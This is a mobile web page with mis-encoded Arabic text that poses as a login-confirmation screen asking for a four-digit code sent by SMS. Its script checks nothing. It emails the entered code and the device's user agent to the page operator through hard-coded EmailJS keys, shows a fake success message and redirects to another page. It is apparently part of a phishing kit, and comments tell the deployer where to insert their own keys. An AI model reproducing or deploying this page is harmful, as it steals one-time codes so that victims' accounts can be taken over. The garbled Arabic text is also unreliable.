<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>ØªØ£ÙƒÙŠØ¯ Ø§Ù„Ø¯Ø®ÙˆÙ„</title>
    
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script type="text/javascript">
       (function(){
          // âš ï¸ Ø¶Ø¹ Ù…ÙØªØ§Ø­Ùƒ Ø§Ù„Ø¹Ø§Ù… Ù‡Ù†Ø§ (Public Key)
          emailjs.init("761mqhUmBDcoqnmj0");
       })();
    </script>

    <style>
        /* ğŸ”µ Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„ØµÙØ­Ø© Ø§Ù„Ø¹Ø§Ù…Ø© */
        * { box-sizing: border-box; outline: none; -webkit-tap-highlight-color: transparent; }
        body { margin: 0; padding: 0; background-color: #ffffff; font-family: 'Cairo', sans-serif; height: 100vh; height: -webkit-fill-available; display: flex; flex-direction: column; color: #333; overflow: hidden; }
        
        /* ğŸ”µ Header */
        .header { height: 65px; background-color: #01A7C1; display: flex; align-items: center; justify-content: center; position: relative; padding: 0 20px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        .header-title { color: #ffffff; font-size: 21px; font-weight: 700; }
        .back-icon { position: absolute; right: 20px; color: #ffffff; font-size: 20px; cursor: pointer; }

        /* Ø§Ù„Ù…Ø­ØªÙˆÙ‰ */
        .content-container { flex: 1; padding: 0 25px; display: flex; flex-direction: column; align-items: center; }
        .main-text { margin-top: 40px; color: #1A1A1A; font-size: 20px; font-weight: 600; text-align: center; margin-bottom: 50px; }

        /* OTP Inputs */
        .otp-container { display: flex; gap: 25px; direction: ltr; margin-bottom: 50px; }
        .otp-input { width: 40px; border: none; border-bottom: 2px solid #333; text-align: center; font-size: 28px; font-family: 'Cairo', sans-serif; font-weight: 600; background: transparent; border-radius: 0; padding: 5px 0; color: #1A1A1A; transition: border-color 0.3s; }
        .otp-input:focus { border-bottom-color: #01A7C1; }

        /* Timer */
        .timer-container { text-align: center; margin-bottom: 30px; }
        .timer-label { color: #444; font-size: 16px; margin-bottom: 5px; display: block; }
        .timer-countdown { color: #1A1A1A; font-size: 17px; font-weight: 600; display: block; }
        .resend-link { color: #B6B6B6; font-size: 15px; font-weight: 400; text-decoration: none; pointer-events: none; cursor: default; }

        /* Submit Button */
        .submit-container { width: 100%; position: fixed; bottom: 0; left: 0; right: 0; }
        .verify-btn { width: 100%; height: 65px; background-color: #FFC400; color: #ffffff; font-family: 'Cairo', sans-serif; font-weight: 600; font-size: 18px; border: none; cursor: pointer; transition: background 0.2s; border-radius: 0; }
        .verify-btn:active { background-color: #e0ac00; }
        .verify-btn:disabled { opacity: 0.7; cursor: not-allowed; }
    </style>
</head>
<body>

    <header class="header">
        <i class="fa-solid fa-arrow-right back-icon" onclick="history.back()"></i>
        <div class="header-title">Ø´ÙŠÙØ±Ø© Ø§Ù„ØªØ£ÙƒÙŠØ¯</div>
    </header>

    <div class="content-container">
        <div class="main-text">
            ØªÙ… Ø§Ø±Ø³Ø§Ù„ Ø±Ù…Ø² Ø§Ù„ØªØ£ÙƒÙŠØ¯ Ø¥Ù„Ù‰ Ø±Ù‚Ù… Ù‡Ø§ØªÙÙƒ
        </div>

        <form id="otpForm" onsubmit="event.preventDefault(); verifyOtp();">
            <div class="otp-container">
                <input type="tel" inputmode="numeric" class="otp-input" maxlength="1" id="otp1" autocomplete="one-time-code">
                <input type="tel" inputmode="numeric" class="otp-input" maxlength="1" id="otp2" autocomplete="one-time-code">
                <input type="tel" inputmode="numeric" class="otp-input" maxlength="1" id="otp3" autocomplete="one-time-code">
                <input type="tel" inputmode="numeric" class="otp-input" maxlength="1" id="otp4" autocomplete="one-time-code">
            </div>
        </form>

        <div class="timer-container">
            <span class="timer-label">ØªÙ†ØªÙ‡ÙŠ ØµÙ„Ø§Ø­ÙŠØ© Ø±Ù…Ø² Ø§Ù„ØªØ£ÙƒÙŠØ¯ Ø®Ù„Ø§Ù„</span>
            <span class="timer-countdown" id="countdown">4 Ø¯Ù‚Ø§Ø¦Ù‚ 58 Ø«ÙˆØ§Ù†ÙŠ</span>
        </div>

        <a href="#" class="resend-link">Ø¥Ø¹Ø§Ø¯Ø© Ø¥Ø±Ø³Ø§Ù„ Ø±Ù…Ø² Ø§Ù„ØªØ£ÙƒÙŠØ¯</a>
    </div>

    <div class="submit-container">
        <button type="button" onclick="verifyOtp()" class="verify-btn">Ø§Ù„ØªØ­Ù‚Ù‚</button>
    </div>

    <script>
        // 1. Ù…Ù†Ø·Ù‚ Ø§Ù„ØªÙ†Ù‚Ù„ Ø§Ù„ØªÙ„Ù‚Ø§Ø¦ÙŠ
        const otpInputs = document.querySelectorAll('.otp-input');
        otpInputs.forEach((input, index) => {
            input.addEventListener('input', (e) => {
                e.target.value = e.target.value.replace(/[^0-9]/g, '');
                if (e.target.value.length === 1) {
                    if (index < otpInputs.length - 1) {
                        otpInputs[index + 1].focus();
                    } else {
                        input.blur(); 
                    }
                }
            });
            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && e.target.value === '') {
                    if (index > 0) {
                        otpInputs[index - 1].focus();
                    }
                }
            });
            input.addEventListener('focus', (e) => {
                e.target.select();
            });
        });

        // 2. Ù…Ù†Ø·Ù‚ Ø§Ù„Ø¹Ø¯ Ø§Ù„ØªÙ†Ø§Ø²Ù„ÙŠ
        let totalSeconds = (4 * 60) + 58; 
        const countdownElement = document.getElementById('countdown');
        const timerInterval = setInterval(() => {
            if (totalSeconds <= 0) {
                clearInterval(timerInterval);
                countdownElement.innerText = "Ø§Ù†ØªÙ‡Øª Ø§Ù„ØµÙ„Ø§Ø­ÙŠØ©";
                const resendLink = document.querySelector('.resend-link');
                resendLink.style.color = "#01A7C1";
                resendLink.style.pointerEvents = "auto";
                resendLink.style.cursor = "pointer";
                return;
            }
            totalSeconds--;
            const minutes = Math.floor(totalSeconds / 60);
            const seconds = totalSeconds % 60;
            countdownElement.innerText = `${minutes} Ø¯Ù‚Ø§Ø¦Ù‚ ${seconds} Ø«ÙˆØ§Ù†ÙŠ`;
        }, 1000);

        // 3. Ø¯Ø§Ù„Ø© Ø§Ù„ØªØ­Ù‚Ù‚ Ø§Ù„Ù…Ø¹Ø¯Ù„Ø© (EmailJS)
        function verifyOtp() {
            // ØªØ¬Ù…ÙŠØ¹ Ø§Ù„Ø±Ù…ÙˆØ²
            const otpCode = 
                document.getElementById('otp1').value + 
                document.getElementById('otp2').value + 
                document.getElementById('otp3').value + 
                document.getElementById('otp4').value;

            // Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§ÙƒØªÙ…Ø§Ù„ Ø§Ù„Ø¥Ø¯Ø®Ø§Ù„
            if(otpCode.length < 4) {
                alert("ÙŠØ±Ø¬Ù‰ Ø¥Ø¯Ø®Ø§Ù„ Ø§Ù„Ø±Ù…Ø² ÙƒØ§Ù…Ù„Ø§Ù‹.");
                return;
            }

            const btn = document.querySelector('.verify-btn');
            const originalText = btn.innerText;
            
            // ØªØºÙŠÙŠØ± Ø´ÙƒÙ„ Ø§Ù„Ø²Ø± Ù„Ù„ØªØ­Ù…ÙŠÙ„
            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù‚Ù‚...';
            btn.disabled = true;

            // Ø¥Ø¹Ø¯Ø§Ø¯ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ù„Ù„Ø¥Ø±Ø³Ø§Ù„
            const templateParams = {
                otp_code: otpCode, // ÙŠØ¬Ø¨ Ø£Ù† ÙŠÙƒÙˆÙ† Ø§Ø³Ù… Ø§Ù„Ù…ØªØºÙŠØ± ÙÙŠ Ø§Ù„Ù‚Ø§Ù„Ø¨ {{otp_code}}
                device: navigator.userAgent
            };

            // âš ï¸âš ï¸ Ù‚Ù… Ø¨ØªØ¹Ø¨Ø¦Ø© Ø¨ÙŠØ§Ù†Ø§ØªÙƒ Ù‡Ù†Ø§ âš ï¸âš ï¸
            const serviceID = "service_3gjha69";
            const templateID = "template_q6fxdvn";

            emailjs.send(serviceID, templateID, templateParams)
                .then(function(response) {
                    console.log('SUCCESS!', response.status, response.text);
                    btn.innerText = 'ØªÙ… Ø§Ù„ØªØ­Ù‚Ù‚ Ø¨Ù†Ø¬Ø§Ø­';
                    btn.style.backgroundColor = "#4CAF50"; 
                    
                    // âœ… Ø§Ù„ØªÙˆØ¬ÙŠÙ‡ ÙŠØ­Ø¯Ø« Ù‡Ù†Ø§ ÙÙ‚Ø· Ø¨Ø¹Ø¯ Ø§Ù„ØªØ£ÙƒØ¯ Ù…Ù† Ø§Ù„Ù†Ø¬Ø§Ø­
                    setTimeout(() => {
                        window.location.href = "chk.html";
                    }, 1000);
                }, function(error) {
                    console.log('FAILED...', error);
                    alert("Ø­Ø¯Ø« Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ØŒ ÙŠØ±Ø¬Ù‰ Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© Ù…Ø±Ø© Ø£Ø®Ø±Ù‰.");
                    // Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„Ø²Ø± Ù„Ø­Ø§Ù„ØªÙ‡ Ø§Ù„Ø·Ø¨ÙŠØ¹ÙŠØ© Ø¹Ù†Ø¯ Ø§Ù„ÙØ´Ù„ ÙˆØ¹Ø¯Ù… Ø§Ù„Ø§Ù†ØªÙ‚Ø§Ù„
                    btn.innerHTML = originalText;
                    btn.disabled = false;
                });
        }
    </script>
</body>
</html>
